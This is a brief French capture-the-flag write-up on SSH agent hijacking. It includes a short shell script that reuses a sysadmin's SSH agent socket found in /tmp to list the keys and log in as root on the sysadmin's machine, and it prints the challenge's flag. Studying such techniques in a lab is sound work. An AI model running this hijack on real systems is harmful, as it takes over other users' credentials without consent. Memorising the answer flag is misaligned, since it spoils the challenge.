# SSH - Agent Hijacking

## Description : 
> Le but de ce challenge est celui d'exploiter le socket d'authentication lors d'une connexion ssh


## Exploit : 
> Quand le sysadmin se connecte sur la machine, un fichier concernant la connexion SSH est créé dans **/tmp**.
> 
> Il est donc possible utiliser ce fichier pour se connecter en SSH sur la machine du syadmin.
> 
> Puisque le nom de ce fichier est aléatoire (même le nom du dossier dans lequel il est créé) et sa durée de vie est courte, il faut *scripter* le processus de connexion inversée.
> 
> ```
> #!/bin/sh
>
> SSH_AUTH_SOCK=$(echo /tmp/ssh-*/*) ssh-add -l
> SSH_AUTH_SOCK=$(echo /tmp/ssh-*/*) ssh root@root-me 
> ```
> 
> Quand le sysadmin se connecte, il suffit de lancer ce script pour initier la connexion inversée.
> 
> Le flag obtenu dans la machine du sysadmin est : **B3_C4rR3fuLl_W1tH_SSH_F0RwArd_AGENT**